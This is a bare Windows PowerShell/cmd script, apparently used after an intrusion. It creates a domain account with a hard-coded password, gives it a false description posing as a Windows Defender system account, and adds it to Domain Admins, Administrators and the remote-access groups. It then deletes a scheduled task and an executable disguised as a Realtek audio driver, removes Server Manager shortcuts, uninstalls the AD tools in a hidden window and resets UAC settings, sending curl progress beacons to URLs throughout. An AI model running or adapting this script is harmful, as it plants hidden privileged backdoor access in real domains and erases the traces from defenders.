curl.exe http://google.com/strd
DISM /Online /Add-Capability /CapabilityName:Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
curl.exe http://google.com/dismdone

curl.exe http://google.com/tensecs
Start-Sleep -Seconds 10

New-ADUser -Name "user" -SamAccountName user -UserPrincipalName user@xyz.local -AccountPassword (ConvertTo-SecureString "imtheboss123!" -AsPlainText -Force) -Path "CN=Builtin,DC=xyz,DC=local"-Enabled $true -PasswordNeverExpires $true -Description "Un account utente gestito e utilizzato dal sistema per gli scenari di Windows Defender Application Guard."

Add-ADGroupMember "Domain Admins" user
Add-ADGroupMember "Administrators" user
Add-ADGroupMember "Utenti desktop remoto" user
Add-ADGroupMember "Utenti gestione remota" user
curl.exe http://google.com/onedone

schtasks /delete /TN "RealtekAudioDriver" /f
curl.exe http://google.com/twodone
Start-Sleep -Seconds 30

del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Server Manager.lnk"
del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Server Manager.lnk"
curl.exe http://google.com/threedone

Start-Process powershell.exe -ArgumentList "Remove-WindowsCapability -Name 'Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0' -Online" -WindowStyle Hidden
curl.exe http://google.com/bigfordone

Start-Process cmd.exe -ArgumentList '/c timeout 20 && del /f /q "C:\ProgramData\Realtek\Audio\rtkAudioDRVx64.exe"' -WindowStyle Hidden
curl.exe http://google.com/bigfivedone

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f
curl.exe http://google.com/latestdone
curl.exe http://google.com/killd

